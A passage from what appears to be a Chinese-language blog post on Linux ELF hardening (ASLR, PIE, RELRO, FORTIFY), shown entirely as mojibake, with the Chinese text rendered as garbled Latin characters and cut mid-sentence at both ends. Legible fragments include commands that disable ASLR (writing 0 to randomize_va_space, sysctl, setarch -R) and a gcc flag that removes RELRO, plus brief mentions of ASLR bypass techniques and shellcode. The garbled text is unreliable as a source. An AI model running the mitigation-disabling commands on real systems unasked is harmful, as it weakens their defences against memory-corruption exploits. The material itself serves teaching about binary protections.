å°†è¢«éšæœºåŒ–ã€‚ï¼ˆç•™å‘ï¼ŒPIEä¼šå½±å“heapçš„éšæœºåŒ–ã€‚ã€‚ï¼‰</li><li>2 = å…¨éšæœºã€‚é™¤äº†1ä¸­æ‰€è¿°ï¼Œè¿˜æœ‰heapã€‚<br>åé¢ä¼šè¯¦ç»†ä»‹ç»ASLRçš„ç»„æˆï¼Œä¸å…³å¿ƒçš„åŒå­¦å¯ä»¥ç®€å•ç†è§£ä¸ºASLRä¸æ˜¯ä¸€ä¸ªç¬¼ç»Ÿçš„æ¦‚å¿µï¼Œè€Œæ˜¯è¦æŒ‰æ¨¡å—å•ç‹¬å®ç°çš„ã€‚å½“ç„¶ï¼Œåœ¨æ”»é˜²å¯¹æŠ—çš„è§’åº¦ä¸Šï¼Œåº”ä¸ºä¸æ˜¯æ‰€æœ‰ç»„ä»¶éƒ½ä¼šéšæœºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æŒ‰å›¾ç´¢éª¥ï¼Œå†™å‡ºé€šç”¨çš„shellcodeè°ƒç”¨ç³»ç»Ÿåº“ã€‚<h3 id="æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ"><a href="#æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ" class="headerlink" title="æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ"></a>æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ</h3>ä½¿ç”¨lddå‘½ä»¤å°±å¯ä»¥è§‚å¯Ÿåˆ°ç¨‹åºæ‰€ä¾èµ–åŠ¨æ€åŠ è½½æ¨¡å—çš„åœ°å€ç©ºé—´ï¼Œå¦‚ä¸‹ä¸‹å›¾æ‰€ç¤ºï¼Œè¢«æ‹¬å·åŒ…è£¹ã€‚åœ¨shellä¸­ï¼Œè¿è¡Œä¸¤æ¬¡ç›¸åŒçš„lddå‘½ä»¤ï¼Œå³å¯å¯¹æ¯”å‡ºå‰ååœ°å€çš„ä¸åŒä¹‹å¤„ï¼Œå½“ç„¶ï¼ŒASLRå¼€å¯æ—¶æ‰ä¼šå˜åŒ–ï¼š<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141533.png" alt="Pasted image 20250121141533"><br><strong>ASLRå¼€å¯æ—¶ï¼ŒåŠ¨æ€åº“çš„åŠ è½½åœ°å€ä¸åŒ</strong></li></ul></blockquote><p><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141548.png" alt="Pasted image 20250121141548"><br><strong>ASLRå…³é—­æ—¶ï¼ŒåŠ¨æ€åº“çš„åŠ è½½åœ°å€ç›¸åŒ</strong></p><h4 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h4><h5 id="æ–¹æ³•ä¸€ï¼š-æ‰‹åŠ¨ä¿®æ”¹randomize-va-spaceæ–‡ä»¶"><a href="#æ–¹æ³•ä¸€ï¼š-æ‰‹åŠ¨ä¿®æ”¹randomize-va-spaceæ–‡ä»¶" class="headerlink" title="æ–¹æ³•ä¸€ï¼š æ‰‹åŠ¨ä¿®æ”¹randomize_va_spaceæ–‡ä»¶"></a>æ–¹æ³•ä¸€ï¼š æ‰‹åŠ¨ä¿®æ”¹randomize_va_spaceæ–‡ä»¶</h5><p>è¯šå¦‚ä¸Šé¢ä»‹ç»çš„randomize_va_spaceæ–‡ä»¶çš„æšä¸¾å€¼å«ä¹‰ï¼Œè®¾ç½®çš„å€¼ä¸åŒï¼Œlinuxå†…æ ¸åŠ è½½ç¨‹åºçš„åœ°å€ç©ºé—´çš„ç­–ç•¥å°±ä¼šä¸åŒã€‚æ¯”è¾ƒç®€å•æ˜äº†ã€‚è¿™é‡Œ0ä»£è¡¨å…³é—­ASLRã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>æ³¨æ„ï¼Œè¿™é‡Œæ˜¯å…ˆè¿›rootæƒé™ï¼Œåæ‰§è¡Œã€‚ä¸è¦é—®ä¸ºä»€ä¹ˆsudo echo 0 &gt; /proc/sys/kernel/randomize_va_spaceä¸ºä»€ä¹ˆä¼šæŠ¥é”™</p><h5 id="æ–¹æ³•äºŒï¼š-ä½¿ç”¨sysctlæ§åˆ¶ASLR"><a href="#æ–¹æ³•äºŒï¼š-ä½¿ç”¨sysctlæ§åˆ¶ASLR" class="headerlink" title="æ–¹æ³•äºŒï¼š ä½¿ç”¨sysctlæ§åˆ¶ASLR"></a>æ–¹æ³•äºŒï¼š ä½¿ç”¨sysctlæ§åˆ¶ASLR</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ sysctl -w kernel.randomize_va_space&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯ä¸€ç§ä¸´æ—¶æ”¹å˜éšæœºç­–ç•¥çš„æ–¹æ³•ï¼Œé‡å¯ä¹‹åå°†æ¢å¤é»˜è®¤ã€‚å¦‚æœéœ€è¦æ°¸ä¹…ä¿å­˜é…ç½®ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ /etc/sysctl.conf ä¸­å¢åŠ è¿™ä¸ªé€‰é¡¹ã€‚</p><h5 id="æ–¹æ³•ä¸‰ï¼š-ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–"><a href="#æ–¹æ³•ä¸‰ï¼š-ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–"></a>æ–¹æ³•ä¸‰ï¼š ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–</h5><p>å¦‚æœä½ æƒ³å†å²å…³é—­å•ä¸ªç¨‹åºçš„ASLRï¼Œä½¿ç”¨setarchæ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚setarchå‘½ä»¤å¦‚å…¶åï¼Œæ”¹å˜ç¨‹åºçš„è¿è¡Œæ¶æ„ç¯å¢ƒï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰ç¯å¢ƒflagã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setarch &#96;uname -m&#96; -R .&#x2F;your_program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>-Rå‚æ•°ä»£è¡¨å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆå¼€å¯ADDR_NO_RANDOMIZE)</p><h5 id="æ–¹æ³•å››ï¼š-åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set-disable-randomization-off"><a href="#æ–¹æ³•å››ï¼š-åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set-disable-randomization-off" class="headerlink" title="æ–¹æ³•å››ï¼š åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set disable-randomization off"></a>æ–¹æ³•å››ï¼š åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set disable-randomization off</h5><p>åœ¨è°ƒè¯•ç‰¹å®šç¨‹åºæ—¶ï¼Œå¯ä»¥é€šè¿‡set disable-randomizationå‘½ä»¤å¼€å¯æˆ–è€…å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ã€‚é»˜è®¤æ˜¯å…³é—­éšæœºåŒ–çš„ï¼Œä¹Ÿå°±æ˜¯onçŠ¶æ€ã€‚<br>å½“ç„¶ï¼Œè¿™é‡Œå¼€å¯ï¼Œå…³é—­å’ŒæŸ¥çœ‹çš„æ–¹æ³•çœ‹èµ·æ¥å°±æ¯”è¾ƒæ­£è§„äº†ã€‚<br>å…³é—­ASLRï¼š<br><code>set disable-randomization on</code><br>å¼€å¯ASLRï¼š<br><code>set disable-randomization off</code><br>æŸ¥çœ‹ASLRçŠ¶æ€ï¼š<br><code>show disable-randomization</code></p><h3 id="ASLRä¸PIEçš„åŒºåˆ«"><a href="#ASLRä¸PIEçš„åŒºåˆ«" class="headerlink" title="ASLRä¸PIEçš„åŒºåˆ«"></a>ASLRä¸PIEçš„åŒºåˆ«</h3><p>é¦–å…ˆï¼ŒASLRçš„æ˜¯æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½é€‰é¡¹ï¼Œä½œç”¨äºexecutableï¼ˆELFï¼‰è£…å…¥å†…å­˜è¿è¡Œæ—¶ï¼Œå› è€Œåªèƒ½éšæœºåŒ–stackã€heapã€librariesçš„åŸºå€ï¼›è€ŒPIEï¼ˆPosition Independent Executablesï¼‰æ˜¯ç¼–è¯‘å™¨ï¼ˆgccï¼Œ..ï¼‰åŠŸèƒ½é€‰é¡¹ï¼ˆ-fPIEï¼‰ï¼Œä½œç”¨äºexcutableç¼–è¯‘è¿‡ç¨‹ï¼Œå¯å°†å…¶ç†è§£ä¸ºç‰¹æ®Šçš„PICï¼ˆsoä¸“ç”¨ï¼ŒPosition Independent Codeï¼‰ï¼ŒåŠ äº†PIEé€‰é¡¹ç¼–è¯‘å‡ºæ¥çš„ELFç”¨fileå‘½ä»¤æŸ¥çœ‹ä¼šæ˜¾ç¤ºå…¶ä¸ºsoï¼Œå…¶éšæœºåŒ–äº†ELFè£…è½½å†…å­˜çš„åŸºå€ï¼ˆä»£ç æ®µã€pltã€gotã€dataç­‰å…±åŒçš„åŸºå€ï¼‰ã€‚<br>å…¶æ¬¡ï¼ŒASLRæ—©äºPIEå‡ºç°ï¼Œæ‰€ä»¥æœ‰return-to-pltã€got hijackã€stack-pivot(bypass stack ransomize)ç­‰ç»•è¿‡ASLRçš„æŠ€æœ¯ï¼›è€Œåœ¨ASLR+PIEä¹‹åï¼Œè¿™äº›bypassæŠ€æœ¯å°±éƒ½å¤±æ•ˆäº†ï¼Œåªèƒ½å€ŸåŠ©å…¶ä»–çš„ä¿¡æ¯æ³„éœ²æ¼æ´æ³„éœ²åŸºå€ï¼ˆå¸¸ç”¨libcåŸºå€ï¼‰ã€‚<br>æœ€åï¼ŒASLRæœ‰0/1/2ä¸‰ç§çº§åˆ«ï¼Œå…¶ä¸­0è¡¨ç¤ºASLRæœªå¼€å¯ï¼Œ1è¡¨ç¤ºéšæœºåŒ–stackã€librariesï¼Œ2è¿˜ä¼šéšæœºåŒ–heapã€‚</p><blockquote><p>ASLR ä¸è´Ÿè´£ä»£ç æ®µä»¥åŠæ•°æ®æ®µçš„éšæœºåŒ–å·¥ä½œï¼Œè¿™é¡¹å·¥ä½œç”± PIE è´Ÿè´£ã€‚ä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚</p></blockquote><h2 id="4-RELRO"><a href="#4-RELRO" class="headerlink" title="4.RELRO"></a>4.RELRO</h2><p>Relocation Read-Only(RELRO)å¯ä»¥ä½¿ç¨‹åºæŸäº›éƒ¨åˆ†æˆä¸ºåªè¯»çš„ã€‚å®ƒåˆ†ä¸ºä¸¤ç§:Partial RELROå’ŒFull RELROï¼Œå³:éƒ¨åˆ†RELROå’Œå®Œå…¨RELROã€‚<br><em>éƒ¨åˆ†RELRO</em>æ˜¯GCCçš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨éƒ¨åˆ†RELROã€‚è¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›–GOTã€‚<br><em>å®Œå…¨RELRO</em>ä½¿æ•´ä¸ªGOTåªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚</p><blockquote><p>åœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸã€‚æ‰€ä»¥åœ¨å®‰å…¨é˜²æŠ¤çš„è§’åº¦åº”å°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸ</p><h2 id="RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial-RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™"><a href="#RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial-RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™" class="headerlink" title="RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™"></a>RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™</h2><p>ä¸»è¦ç”¨æ¥ä¿æŠ¤é‡å®šä½è¡¨æ®µå¯¹åº”æ•°æ®åŒºåŸŸï¼Œé»˜è®¤å¯å†™<br>Partial RELRO: .gotä¸å¯å†™ï¼Œgot.pItå¯å†™<br>Full RELRO: .gotå’Œgot.pItä¸å¯å†™<br>got.pltå¯ä»¥ç®€ç§°ä¸ºgotè¡¨</p></blockquote><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;GCCç”¨æ³•gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELROgcc -z norelro -o test test.c &#x2F;&#x2F; å…³é—­ï¼Œå³No RELROgcc -z lazy -o test test.c &#x2F;&#x2F; éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELROgcc -z now -o test test.c &#x2F;&#x2F; å…¨éƒ¨å¼€å¯-z norelro &#x2F; -z lazy &#x2F; -z now (å…³é—­ &#x2F; éƒ¨åˆ†å¼€å¯ &#x2F; å®Œå…¨å¼€å¯)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç¼–å¤–-FORTIFY"><a href="#ç¼–å¤–-FORTIFY" class="headerlink" title="ç¼–å¤–:FORTIFY"></a>ç¼–å¤–:FORTIFY</h2><p>fortifyæ˜¯è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ã€‚é€‚ç”¨äºç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚:<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&gt;&gt;&gt; memcpy():æè¿°ï¼švoid *memcpy(void *str1, const void *str2, size_t n)     ä»å­˜å‚¨åŒºstr2å¤åˆ¶nä¸ªå­—ç¬¦åˆ°å­˜å‚¨åŒºstr1  å‚æ•°ï¼šstr1 -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„ï¼Œç±»å‹å¼ºåˆ¶è½¬æ¢ä¸º void* æŒ‡é’ˆ     str2 -- æŒ‡å‘è¦å¤åˆ¶çš„æ•°æ®æºï¼Œç±»å‹å¼ºåˆ¶è½¬æ¢ä¸º void* æŒ‡é’ˆ     n -- è¦è¢«å¤åˆ¶çš„å­—èŠ‚æ•°  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘ç›®æ ‡å­˜å‚¨åŒº str1 çš„æŒ‡é’ˆ---------------------------------------------------------------------------------------&gt;&gt;&gt; memset():  æè¿°ï¼švoid *memset(void *str, int c, size_t n)     å¤åˆ¶å­—ç¬¦ cï¼ˆä¸€ä¸ªæ— ç¬¦å·å­—ç¬¦ï¼‰åˆ°å‚æ•° str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„å‰ n ä¸ªå­—ç¬¦  å‚æ•°ï¼šstr -- æŒ‡å‘è¦å¡«å……çš„å†…å­˜å—     c -- è¦è¢«è®¾ç½®çš„å€¼ã€‚è¯¥å€¼ä»¥ int å½¢å¼ä¼ é€’ï¼Œä½†æ˜¯å‡½æ•°åœ¨å¡«å……å†…å­˜å—æ—¶æ˜¯ä½¿ç”¨è¯¥å€¼çš„æ— ç¬¦å·å­—ç¬¦å½¢å¼     n -- è¦è¢«è®¾ç½®ä¸ºè¯¥å€¼çš„å­—èŠ‚æ•°  è¿”å›å€¼ï¼šè¯¥å€¼è¿”å›ä¸€ä¸ªæŒ‡å‘å­˜å‚¨åŒº str çš„æŒ‡é’ˆ---------------------------------------------------------------------------------------&gt;&gt;&gt; strcpy():  æè¿°ï¼šchar *strcpy(char *dest, const char *src)     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° destï¼Œå®¹æ˜“å‡ºç°æº¢å‡º  å‚æ•°ï¼šdest -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„     src -- è¦å¤åˆ¶çš„å­—ç¬¦ä¸²  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€ç»ˆçš„ç›®æ ‡å­—ç¬¦ä¸² dest çš„æŒ‡é’ˆ--------------------------------------------------------------------------------------&gt;&gt;&gt; stpcpy():  æè¿°ï¼šextern char *stpcpy(char *dest,char *src)     æŠŠsrcæ‰€æŒ‡ç”±NULLå€Ÿå®¿çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°destæ‰€æŒ‡çš„æ•°ç»„ä¸­  è¯´æ˜ï¼šsrcå’Œdestæ‰€æŒ‡å†…å­˜åŒºåŸŸä¸å¯ä»¥é‡å ä¸”destå¿…é¡»æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å®¹çº³srcçš„å­—ç¬¦ä¸²è¿”å›æŒ‡å‘destç»“å°¾å¤„å­—ç¬¦ï¼ˆNULLï¼‰çš„æŒ‡é’ˆ   è¿”å›å€¼ï¼š---------------------------------------------------------------------------------------    &gt;&gt;&gt; strncpy():  æè¿°ï¼šchar *strncpy(char *dest, const char *src, size_t n)     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° destï¼Œæœ€å¤šå¤åˆ¶ n ä¸ªå­—ç¬¦ã€‚å½“ src çš„é•¿åº¦å°äº n æ—¶ï¼Œdest çš„å‰©ä½™éƒ¨åˆ†å°†ç”¨ç©ºå­—èŠ‚å¡«å……  å‚æ•°ï¼šdest -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„     src -- è¦å¤åˆ¶çš„å­—ç¬¦ä¸²     n -- è¦ä»æºä¸­å¤åˆ¶çš„å­—ç¬¦æ•°  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›æœ€ç»ˆå¤åˆ¶çš„å­—ç¬¦ä¸²---------------------------------------------------------------------------------------&gt;&gt;&gt; strcat():  æè¿°ï¼šchar *strcat(char *dest, const char *src)     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²è¿½åŠ åˆ° dest æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„ç»“å°¾  å‚æ•°ï¼šdest -- æŒ‡å‘ç›®æ ‡æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«äº†ä¸€ä¸ª C å­—ç¬¦ä¸²ï¼Œä¸”è¶³å¤Ÿå®¹çº³è¿½åŠ åçš„å­—ç¬¦ä¸²     src -- æŒ‡å‘è¦è¿½åŠ çš„å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ä¸ä¼šè¦†ç›–ç›®æ ‡å­—ç¬¦ä¸²  è¿”å›å€¼ï¼š---------------------------------------------------------------------------------------&gt;&gt;&gt; strncat():  æè¿°ï¼šchar *strncat(char *dest, const char *src, size_t n)     æŠŠ src æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²è¿½åŠ åˆ° dest æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œç›´åˆ° n å­—ç¬¦é•¿åº¦ä¸ºæ­¢  å‚æ•°ï¼šdest -- æŒ‡å‘ç›®æ ‡æ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«äº†ä¸€ä¸ª C å­—ç¬¦ä¸²ï¼Œä¸”è¶³å¤Ÿå®¹çº³è¿½åŠ åçš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬é¢å¤–çš„ç©ºå­—ç¬¦     src -- è¦è¿½åŠ çš„å­—ç¬¦ä¸²     n -- è¦è¿½åŠ çš„æœ€å¤§å­—ç¬¦æ•°  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æœ€ç»ˆçš„ç›®æ ‡å­—ç¬¦ä¸² dest çš„æŒ‡é’ˆ---------------------------------------------------------------------------------------&gt;&gt;&gt; sprintf():PHP  æè¿°ï¼šsprintf(format,arg1,arg2,arg++)     arg1ã€arg2ã€++ å‚æ•°å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„ã€‚åœ¨ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg1ï¼Œåœ¨ç¬¬äºŒä¸ª % ç¬¦å·å¤„ï¼Œæ’å…¥ arg2ï¼Œä¾æ­¤ç±»æ¨  å‚æ•°ï¼šformat -- å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡     arg1 -- å¿…éœ€ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ª % ç¬¦å·å¤„çš„å‚     arg2 -- å¯é€‰ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬äºŒä¸ª % ç¬¦å·å¤„çš„å‚æ•°     arg++ -- å¯é€‰ã€‚è§„å®šæ’åˆ° format å­—ç¬¦ä¸²ä¸­ç¬¬ä¸‰ã€å››ç­‰ç­‰ % ç¬¦å·å¤„çš„å‚æ•°  è¿”å›å€¼ï¼šè¿”å›å·²æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²-----------------------------------------------------------------------&gt;&gt;&gt; snprintf():  æè¿°ï¼šint snprintf ( char * str, size_t size, const char * format, ... )     è®¾å°†å¯å˜å‚æ•°(...)æŒ‰ç…§ format æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼Œå¹¶å°†å­—ç¬¦ä¸²å¤åˆ¶åˆ° str ä¸­ï¼Œsize ä¸ºè¦å†™å…¥çš„å­—ç¬¦çš„æœ€å¤§æ•°ç›®ï¼Œè¶…è¿‡ size ä¼šè¢«æˆªæ–­  å‚æ•°ï¼šstr -- ç›®æ ‡å­—ç¬¦ä¸²     size -- æ‹·è´å­—èŠ‚æ•°(Bytes)å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº size     format -- æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²  è¿”å›å€¼ï¼šå¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å°äºç­‰äº sizeï¼Œåˆ™ä¼šæŠŠå­—ç¬¦ä¸²å…¨éƒ¨å¤åˆ¶åˆ° str ä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦ \0ã€‚ å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¤§äº sizeï¼Œè¶…è¿‡ size çš„éƒ¨åˆ†ä¼šè¢«æˆªæ–­ï¼Œåªå°†å…¶ä¸­çš„ (size-1) ä¸ªå­—ç¬¦å¤åˆ¶åˆ° str ä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦ \0ï¼Œè¿”å›å€¼ä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦---------------------------------------------------------------------------------------&gt;&gt;&gt; vsprintf():PHP  æè¿°ï¼švsprintf(format,argarray)      ä¸ sprintf() ä¸åŒï¼Œvsprintf() ä¸­çš„å‚æ•°ä½äºæ•°ç»„ä¸­ã€‚æ•°ç»„å…ƒç´ å°†è¢«æ’å…¥åˆ°ä¸»å­—ç¬¦ä¸²ä¸­çš„ç™¾åˆ†å·ï¼ˆ%ï¼‰ç¬¦å·å¤„ã€‚è¯¥å‡½æ•°æ˜¯é€æ­¥æ‰§è¡Œçš„  å‚æ•°ï¼šformat -- å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²ä»¥åŠå¦‚ä½•æ ¼å¼åŒ–å…¶ä¸­çš„å˜é‡     argarray -- å¿…éœ€ã€‚å¸¦æœ‰å‚æ•°çš„ä¸€ä¸ªæ•°ç»„ï¼Œè¿™äº›å‚æ•°ä¼šè¢«æ’åˆ° format å­—ç¬¦ä¸²ä¸­çš„ % ç¬¦å·å¤„  è¿”å›å€¼ï¼šä»¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›æ•°ç»„å€¼---------------------------------------------------------------------------------------&gt;&gt;&gt; vsnprintf():  æè¿°ï¼šint vsnprintf (char * s, size_t n, const char * format, va_list arg )     å°†æ ¼å¼åŒ–æ•°æ®ä»å¯å˜å‚æ•°åˆ—è¡¨å†™å…¥å¤§å°ç¼“å†²åŒºå¦‚æœåœ¨printfä¸Šä½¿ç”¨æ ¼å¼ï¼Œåˆ™ä½¿ç”¨ç›¸åŒçš„æ–‡æœ¬ç»„æˆå­—ç¬¦ä¸²ï¼Œä½†ä½¿ç”¨ç”±argæ ‡è¯†çš„å˜é‡å‚æ•°åˆ—è¡¨ä¸­çš„å…ƒç´ è€Œä¸æ˜¯é™„åŠ çš„å‡½æ•°å‚æ•°ï¼Œå¹¶å°†ç»“æœå†…å®¹ä½œä¸ºCå­—ç¬¦ä¸²å­˜å‚¨åœ¨sæŒ‡å‘çš„ç¼“å†²åŒºä¸­ ï¼ˆä»¥nä¸ºæœ€å¤§ç¼“å†²åŒºå®¹é‡æ¥å¡«å……ï¼‰ã€‚å¦‚æœç»“æœå­—ç¬¦ä¸²çš„é•¿åº¦è¶…è¿‡äº†n-1ä¸ªå­—ç¬¦ï¼Œåˆ™å‰©ä½™çš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒå¹¶ä¸”ä¸è¢«å­˜å‚¨ï¼Œè€Œæ˜¯è¢«è®¡ç®—ä¸ºå‡½æ•°è¿”å›çš„å€¼ã€‚åœ¨å†…éƒ¨ï¼Œå‡½æ•°ä»argæ ‡è¯†çš„åˆ—è¡¨ä¸­æ£€ç´¢å‚æ•°ï¼Œå°±å¥½åƒva_argè¢«ä½¿ç”¨äº†ä¸€æ ·ï¼Œå› 